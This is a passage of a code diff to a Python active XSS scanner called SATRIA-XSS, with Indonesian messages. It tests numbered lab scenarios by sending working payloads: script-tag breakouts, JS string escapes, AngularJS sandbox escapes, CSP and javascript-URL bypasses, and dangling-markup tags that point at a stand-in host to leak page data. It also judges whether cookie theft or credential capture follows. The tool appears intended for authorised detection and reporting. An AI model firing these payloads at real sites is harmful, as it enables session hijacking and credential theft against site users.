+                    if "canonical" not in tag.lower(): continue
+                    if marker in tag and re.search(r"onclick\s*=", tag, re.I):
+                        if self._claim(17, point.key, "canon"):
+                            return self._yes(f"Injeksi pada <link rel=canonical> terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"canonical"})
+        return self._no("Tidak ditemukan injeksi pada tag canonical link.")
+
+    def _lab_18(self):
+        # JS string: sq+backslash escaped, but </script> breaks out
+        for build in [lambda m: f"</script><script>alert('{m}')</script>",
+                      lambda m: f"</script><img src=x onerror=alert('{m}')>"]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                if "<script" in payload.lower() and re.search(r"<script[^>]*>[^<]*alert\s*\(\s*['\"]?"+re.escape(marker), body, re.I):
+                    # ensure it's a real injected script tag (exact payload reflected)
+                    if payload in body or re.search(re.escape("</script>")+r"\s*<script", body, re.I):
+                        if self._claim(18, point.key, "sc"):
+                            return self._yes(f"Breakout </script> terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"script_breakout"})
+                if "<img" in payload.lower() and self._handler_in_tag(body, marker, "onerror")[0]:
+                    if re.search(re.escape("</script>"), body, re.I) and self._claim(18, point.key, "scimg"):
+                        return self._yes(f"Breakout </script> via <img> terkonfirmasi di {meta.get('url')}.", {**meta,"context":"script_breakout"})
+        return self._no("Tidak ditemukan breakout </script> pada konteks JS string ter-escape.")
+
+    def _lab_19(self):
+        # JS string: <>" HTML-encoded, sq escaped, backslash not escaped -> \' breaks out
+        for build in [lambda m: f"\\'-alert('{m}')//", lambda m: f"\\';alert('{m}');//"]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact") or not ctx.get("in_script"): continue
+                    pos = ctx.get("pos",0)
+                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
+                    seg = body[seg_e+1: pos+len(marker)+40] if seg_e!=-1 else ""
+                    # look for the escape-bypass result: \' followed by breakout leading to alert
+                    if "alert(" + "'" not in seg and "alert('"+marker not in seg and "alert("+marker not in seg:
+                        # try looser
+                        pass
+                    if re.search(r"\\['\"]?\s*[-;]\s*alert\s*\(", seg) or re.search(r"alert\s*\(\s*['\"]?"+re.escape(marker), seg):
+                        if self._claim(19, point.key, "bs"):
+                            return self._yes(f"Breakout string JS via backslash escape terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_backslash_escape"})
+        return self._no("Tidak ditemukan breakout JS via escape backslash.")
+
+    def _lab_20(self):
+        # Stored XSS into onclick, complex encoding
+        def chk(body, payload, marker):
+            for tag in re.findall(r"<[^>]+>", body, re.S):
+                if marker in tag and re.search(r"\bon[a-z]+\s*=", tag, re.I) and re.search(r"alert\s*\(", tag, re.I):
+                    return True
+            return False
+        for pb in [lambda m: f"&apos;-alert({m})-&apos;", lambda m: f"&#39;-alert({m})-&#39;",
+                   lambda m: f"'-alert({m})-'"]:
+            ok, ev, det = self._stored_check(pb, chk)
+            if ok and self._claim(20, str(det.get("point")), "oc"): return self._yes(ev+" Payload di atribut event handler.", det)
+        return self._no("Tidak ada bukti stored XSS pada onclick/event handler.")
+
+    def _lab_21(self):
+        # Reflected XSS into template literal
+        for build in [lambda m: f"${{alert({m})}}", lambda m: f"${{alert('{m}')}}"]:
+            for point in self._ranked_points()[:12]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if not ctx.get("exact") or not ctx.get("in_script"): continue
+                    if ctx.get("js") == "tpl" or ctx.get("in_template"):
+                        if self._claim(21, point.key, "tpl"): return self._yes(f"Template literal injection terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"template_literal"})
+                    pos = ctx.get("pos",0)
+                    seg_s = body.rfind("<script", 0, pos); seg_e = body.find(">", seg_s) if seg_s!=-1 else -1
+                    seg = body[seg_e+1: pos+len(marker)+15] if seg_e!=-1 else ""
+                    bt_before = seg.rfind("`", 0, max(0,len(seg)-len(marker)-10))
+                    if bt_before != -1 and "${alert(" in seg:
+                        if self._claim(21, point.key, "tpl2"): return self._yes(f"Template literal injection terkonfirmasi di {meta.get('url')}.", {**meta,"context":"template_literal"})
+        return self._no("Tidak ditemukan injeksi template literal yang terkonfirmasi.")
+
+    def _exec_labs(self):
+        return sorted(lid for lid in _EXECUTABLE_LAB_IDS if self._results.get(lid,{}).get("confirmed"))
+
+    def _lab_22(self):
+        deps = self._exec_labs()
+        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
+        cookies = list(self._set_cookies)
+        try:
+            for c in self.session.cookies: cookies.append(f"{c.name}={c.value}")
+        except Exception: pass
+        if not cookies: return self._no("Tidak teramati cookie; klaim pencurian cookie tidak terbukti.")
+        non_http = [c for c in cookies if "httponly" not in c.lower()]
+        if not non_http: return self._no("Cookie teramati HttpOnly; document.cookie tidak dapat membaca.")
+        return self._yes(f"XSS executable (lab {deps}) + cookie non-HttpOnly teramati: pencurian cookie dimungkinkan.", {"depends_on":deps,"impact":"cookie_theft"})
+
+    def _lab_23(self):
+        deps = self._exec_labs()
+        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
+        has_pw = any(re.search(r'type\s*=\s*["\']?password', (p.text or ""), re.I) for p in self.pages) or any(f.has_password for p in self.pages for f in p.forms)
+        if not has_pw: return self._no("Tidak ditemukan input password; klaim tidak terbukti.")
+        return self._yes(f"XSS executable (lab {deps}) + form password terdeteksi: penangkapan kredensial dimungkinkan.", {"depends_on":deps,"impact":"password_capture"})
+
+    def _lab_24(self):
+        deps = self._exec_labs()
+        if not deps: return self._no("Belum ada XSS executable terkonfirmasi.")
+        has_csrf = False
+        for p in self.pages:
+            for f in p.forms:
+                for n,_v,_t in f.fields:
+                    if re.search(r"csrf|authenticity|_token|\bnonce\b|__requestverification", n, re.I): has_csrf=True
+            if re.search(r'csrf|authenticity_token|_token', p.text or "", re.I): has_csrf=True
+        if not has_csrf: return self._no("Tidak terdeteksi token CSRF; klaim tidak terbukti.")
+        return self._yes(f"XSS executable (lab {deps}) + token CSRF terdeteksi: bypass CSRF dimungkinkan.", {"depends_on":deps,"impact":"csrf_bypass"})
+
+    # ==================== LAB 25-30 ====================
+    def _lab_25(self):
+        # AngularJS sandbox escape without strings
+        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
+        scopes = self._angular_scopes()
+        for build in [lambda m: "1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"+m,
+                      lambda m: "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"+m]:
+            for point in self._ranked_points()[:8]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if ctx.get("exact") and not ctx.get("in_script"):
+                        pos = ctx.get("pos",0)
+                        in_scope = (not scopes) or any(s<=pos<=e for _,s,e in scopes)
+                        if in_scope and self._claim(25, point.key, "ngsb"):
+                            return self._yes(f"Payload AngularJS sandbox escape ter-refleksi di scope Angular pada {meta.get('url')}.", {**meta,"context":"angular_sandbox"})
+        return self._no("AngularJS sandbox escape tidak terkonfirmasi.")
+
+    def _lab_26(self):
+        # AngularJS sandbox escape and CSP
+        if not self._csp_header: return self._no("Tidak ada header CSP; skenario tidak berlaku.")
+        if not self._angular_present(): return self._no("AngularJS tidak terdeteksi.")
+        scopes = self._angular_scopes()
+        for build in [lambda m: "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x"+m,
+                      lambda m: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'x=alert(1)'></div>"+m]:
+            for point in self._ranked_points()[:8]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                if marker in body and ("ng-focus" in body or "ng-csp" in body or "orderBy" in body):
+                    for ctx in _analyze_reflection(body, payload, marker):
+                        if ctx.get("exact") and self._claim(26, point.key, "ngcsp"):
+                            return self._yes(f"Payload AngularJS sandbox/CSP ter-refleksi di {meta.get('url')}; CSP: {self._csp_header[:100]}.", {**meta,"csp":self._csp_header[:180]})
+        return self._no("AngularJS sandbox escape + CSP tidak terkonfirmasi.")
+
+    def _lab_27(self):
+        # Event handlers and href blocked - bypass via SVG animate
+        for point in self._ranked_points()[:8]:
+            if not self._lab_budget(): break
+            cm = _random_token()
+            b1,_ = self._send(point, f"<img src=x onerror=alert('{cm}')>")
+            b2,_ = self._send(point, f"<a href=\"javascript:alert('{cm}')\">x</a>")
+            ev_blocked = (b1 is None) or not re.search(r"onerror\s*=\s*alert", b1 or "", re.I)
+            href_blocked = (b2 is None) or not re.search(r'href\s*=\s*["\']?\s*javascript:', b2 or "", re.I)
+            if not (ev_blocked or href_blocked): continue
+            marker = _random_token()
+            payload = f"<svg><a><animate attributeName=href values=javascript:alert('{marker}') /><text x=20 y=20>X</text></a></svg>"
+            body, meta = self._reflects(point, marker, payload)
+            if body and re.search(r"animate[^>]+attributeName\s*=\s*['\"]?href", body, re.I) and re.search(r"javascript\s*:", body, re.I):
+                if self._claim(27, point.key, "anim"):
+                    return self._yes(f"Event handler/href diblokir tapi <animate attributeName=href> lolos di {meta.get('url')} ({meta.get('point')}).", {**meta,"event_blocked":ev_blocked,"href_blocked":href_blocked})
+        return self._no("Tidak ada bypass SVG animate yang terkonfirmasi.")
+
+    def _lab_28(self):
+        # JavaScript URL with some characters blocked
+        for point in self._ranked_points()[:10]:
+            if not self._lab_budget(): break
+            for build in [lambda m: f"&#106;avascript:alert('{m}')",
+                          lambda m: f"&#x6a;avascript:alert('{m}')",
+                          lambda m: f"javascript&colon;alert('{m}')",
+                          lambda m: f"java%09script:alert('{m}')",
+                          lambda m: f"java%0ascript:alert('{m}')"]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                # in href attribute
+                for tag in re.findall(r"<a\b[^>]*>", body, re.I|re.S):
+                    if marker in tag and re.search(r"alert\s*\(", tag, re.I):
+                        if re.search(r"href\s*=", tag, re.I) and re.search(r"javascript|&#106;|&#x6a;|script", tag, re.I):
+                            if self._claim(28, point.key, "jsurl"):
+                                return self._yes(f"Varian JavaScript URL (encoded/whitespace) ter-refleksi di href pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"js_url"})
+                for ctx in _analyze_reflection(body, payload, marker):
+                    if ctx.get("in_attr") and ctx.get("attr_name")=="href" and "alert" in body[max(0,ctx.get("pos",0)-50):ctx.get("pos",0)+80]:
+                        if self._claim(28, point.key, "jsurl2"):
+                            return self._yes(f"Varian JavaScript URL ter-refleksi di atribut href pada {meta.get('url')}.", {**meta})
+        return self._no("Tidak ada bypass JavaScript URL yang terkonfirmasi.")
+
+    def _lab_29(self):
+        # Strict CSP, dangling markup
         csp = self._csp_header
-        if not _csp_is_strict(csp):
-            return self._no("CSP tidak ketat (atau tidak ada), sehingga skenario dangling markup tidak berlaku.")
-        marker = _random_token()
-        payload = '<img src="//satria-canary.invalid/?' + marker
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload dangling markup tidak ter-refleksi.")
-        for ctx in _analyze_reflection(body, payload, marker):
-            if not ctx["exact"] or not ctx["in_tag"] or not ctx["in_attr"]:
-                continue
-            if ctx["attr_name"] != "src":
-                continue
-            return True, "CSP ketat memblokir inline script, tetapi tag <img src=...> tak tertutup (dangling markup) ter-refleksi mentah dan dapat mengeksfiltrasi data.", {
-                "context": "dangling_markup", "csp": csp[:200], **meta}
-        return self._no("Tidak ada refleksi dangling markup pada konteks yang dapat mengeksfiltrasi data.")
+        if not csp: return self._no("Tidak ada header CSP.")
+        if "'unsafe-inline'" in csp.lower(): return self._no("CSP mengizinkan unsafe-inline; bukan skenario dangling markup ketat.")
+        for build in [lambda m: f'<img src="https://satria.invalid/?c={m}',
+                      lambda m: f"<base href='https://satria.invalid/{m}/'>"]:
+            for point in self._ranked_points()[:10]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = build(marker)
+                body, meta = self._reflects(point, marker, payload)
+                if not body: continue
+                for m in re.finditer(re.escape(marker), body):
+                    ctx = _context_at(body, m.start())
+                    if ctx.get("in_attr") and ctx.get("in_tag"):
+                        s = body.rfind("<", 0, m.start()); e = body.find(">", m.start())
+                        tag = body[s:e+1] if s!=-1 and e!=-1 else ""
+                        if (("<img" in payload and re.search(r"<img\b", tag, re.I)) or ("<base" in payload and re.search(r"<base\b", tag, re.I))):
+                            if self._claim(29, point.key, "dang"):
+                                return self._yes(f"Dangling markup ter-refleksi di bawah CSP ketat pada {meta.get('url')} ({meta.get('point')}).", {**meta,"csp":csp[:150]})
+        return self._no("Tidak ada dangling markup yang terkonfirmasi.")
 
-    def _lab_30(self) -> tuple[bool, str, dict[str, Any]]:
+    def _lab_30(self):
+        # CSP bypass
         csp = self._csp_header
-        if not csp:
-            return self._no("Tidak ada header CSP; skenario bypass CSP tidak berlaku.")
+        if not csp: return self._no("Tidak ada header CSP.")
         sources = _csp_script_sources(csp)
-        hosts = [s for s in sources if s.startswith(("http://", "https://", "//"))]
-        if not hosts:
-            return self._no("CSP tidak mengizinkan host skrip (tanpa host source); tidak ada jalur bypass.")
-        host = hosts[0].split("//", 1)[-1].strip("/")
-        marker = _random_token()
-        payload = '<script src="//' + host + "/satria-" + marker + '.js"></script>'
-        ok, body, meta = self._probe(payload)
-        if not ok:
-            return self._no("Payload <script src=host-izin> tidak ter-refleksi.")
-        if re.search(r"<script[^>]+src\s*=\s*['\"]?//" + re.escape(host), body, re.I):
-            return True, "CSP mengizinkan host " + host + "; payload <script src=host-izin> ter-refleksi mentah sehingga CSP dapat dilewati.", {
-                "context": "csp_bypass", "allowed_host": host, "csp": csp[:200], **meta}
-        return self._no("Payload script dari host yang diizinkan CSP tidak ter-refleksi mentah.")
+        hosts = [s for s in sources if s and not s.startswith("'") and s not in ("data:","blob:","*",'https:','http:')]
+        directives = _csp_directives(csp)
+        # try base-uri bypass if missing
+        if "base-uri" not in directives and "default-src" not in directives:
+            for point in self._ranked_points()[:6]:
+                if not self._lab_budget(): break
+                marker = _random_token(); payload = f"<base href='https://satria.invalid/'>{marker}"
+                body, meta = self._reflects(point, marker, payload)
+                if body and re.search(r"<base\b[^>]+href\s*=\s*['\"]?https?://satria\.invalid", body, re.I):
+                    if self._claim(30, point.key, "base"): return self._yes(f"CSP tanpa base-uri: <base> terinjeksi di {meta.get('url')}.", {**meta,"csp":csp[:150]})
+        if not hosts: return self._no("CSP tidak memiliki host script allowlist yang dapat dieksploitasi secara langsung.")
+        host = hosts[0].strip().replace("https://","").replace("http://","").replace("//","").split("/")[0]
+        if not host or host.startswith("'"): return self._no("Host CSP tidak dapat diparse.")
+        for point in self._ranked_points()[:10]:
+            if not self._lab_budget(): break
+            marker = _random_token(); payload = f"<script src='//{host}/s{marker}.js'></script>"
+            body, meta = self._reflects(point, marker, payload)
+            if body and re.search(r"<script\b[^>]+src\s*=\s*['\"]?(?:https?:)?//"+re.escape(host), body, re.I):
+                if self._claim(30, point.key, "host"): return self._yes(f"CSP allowlist ({host}) dapat dilewati: <script src> ter-refleksi di {meta.get('url')}.", {**meta,"csp":csp[:150],"allowed_host":host})
+        return self._no("Bypass CSP tidak terkonfirmasi.")
 
-    # =======================================================================
-    # Orkestrasi
-    # =======================================================================
+    # ==================== Orchestration ====================
     def _test_all_labs(self) -> None:
-        tests: dict[int, Callable[[], tuple[bool, str, dict[str, Any]]]] = {
-            1: self._lab_01, 2: self._lab_02, 3: self._lab_03, 4: self._lab_04,
-            5: self._lab_05, 6: self._lab_06, 7: self._lab_07, 8: self._lab_08,
-            9: self._lab_09, 10: self._lab_10, 11: self._lab_11, 12: self._lab_12,
-            13: self._lab_13, 14: self._lab_14, 15: self._lab_15, 16: self._lab_16,
-            17: self._lab_17, 18: self._lab_18, 19: self._lab_19, 20: self._lab_20,
-            21: self._lab_21, 22: self._lab_22, 23: self._lab_23, 24: self._lab_24,
-            25: self._lab_25, 26: self._lab_26, 27: self._lab_27, 28: self._lab_28,
-            29: self._lab_29, 30: self._lab_30,
-        }
+        tests = {i: getattr(self, f"_lab_{i:02d}") for i in range(1, 31)}
         for lab_id, title, _key, _severity in CATALOG:
             self._lab_id = lab_id
             self._lab_used = 0
-            print("[PROGRESS " + str(lab_id) + "/" + str(len(CATALOG)) + "] " + title)
-            test = tests.get(lab_id)
+            print(f"[PROGRESS {lab_id}/{len(CATALOG)}] {title}")
             try:
-                confirmed, evidence, details = test() if test else (False, "Lab tidak tersedia.", {})
+                confirmed, evidence, details = tests[lab_id]()
             except Exception as exc:
-                confirmed, evidence, details = False, "Error pengujian: " + type(exc).__name__ + ": " + str(exc), {}
-                if len(self.stats["errors"]) < 40:
-                    self.stats["errors"].append("lab " + str(lab_id) + ": " + str(exc))
-            self._results[lab_id] = {
-                "confirmed": bool(confirmed),
-                "evidence": evidence or "",
-                "details": details or {},
-                "requests": self._lab_used,
-            }
-            print(("  [CONFIRMED] " if confirmed else "  [not-confirmed] ") + str(lab_id).zfill(2) + " " + title)
+                confirmed, evidence, details = False, f"Error pengujian: {type(exc).__name__}: {exc}", {}
+                if len(self.stats["errors"]) < 60:
+                    self.stats["errors"].append(f"lab {lab_id}: {exc}")
+            self._results[lab_id] = {"confirmed": bool(confirmed), "evidence": evidence or "", "details": details or {}, "requests": self._lab_used}
+            status = "[CONFIRMED]" if confirmed else "[not-confirmed]"
+            print(f"  {status} {lab_id:02d} {title}")
 
     def run(self) -> dict[str, Any]:
         self._crawl()
@@ -1484,44 +1430,26 @@ class SatriaXSSScanner:
         return self._build_report()
 
     def _build_report(self) -> dict[str, Any]:
-        labs: list[dict[str, Any]] = []
+        labs = []
         confirmed_count = 0
         for lab_id, title, key, severity in CATALOG:
             result = self._results.get(lab_id, {"confirmed": False, "evidence": "", "details": {}})
             confirmed = bool(result.get("confirmed"))
-            if confirmed:
-                confirmed_count += 1
-            labs.append({
-                "id": lab_id,
-                "title": title,
-                "key": key,
-                "severity": severity,
-                "status": "confirmed" if confirmed else "not_confirmed",
-                "evidence": result.get("evidence", ""),
-                "details": result.get("details", {}),
-                "requests": result.get("requests", 0),
-            })
+            if confirmed: confirmed_count += 1
+            labs.append({"id": lab_id, "title": title, "key": key, "severity": severity,
+                         "status": "confirmed" if confirmed else "not_confirmed",
+                         "evidence": result.get("evidence",""), "details": result.get("details",{}),
+                         "requests": result.get("requests", 0)})
         return {
-            "scanner": "SATRIA-XSS",
-            "version": __version__,
-            "target": self.target_url,
-            "generated_at": datetime.now(timezone.utc).isoformat(),
-            "mode": "active",
-            "summary": {
-                "confirmed": confirmed_count,
-                "not_confirmed": len(CATALOG) - confirmed_count,
-                "total": len(CATALOG),
-            },
+            "scanner": "SATRIA-XSS", "version": __version__, "target": self.target_url,
+            "generated_at": datetime.now(timezone.utc).isoformat(), "mode": "active",
+            "summary": {"confirmed": confirmed_count, "not_confirmed": len(CATALOG)-confirmed_count, "total": len(CATALOG)},
             "labs": labs,
-            "scan_stats": {
-                "pages_fetched": self.stats.get("pages_fetched", 0),
-                "requests": self.stats.get("requests", 0),
-                "points": len(self.points),
-                "external_scripts": len(self._script_srcs),
-                "csp": self._csp_header[:300],
-                "errors": self.stats.get("errors", []),
-            },
+            "scan_stats": {"pages_fetched": self.stats.get("pages_fetched",0), "requests": self.stats.get("requests",0),
+                           "points": len(self.points), "external_scripts": len(self._script_srcs),
+                           "csp": self._csp_header[:300], "errors": self.stats.get("errors",[])},
         }
+
 
 
 def scan_target(
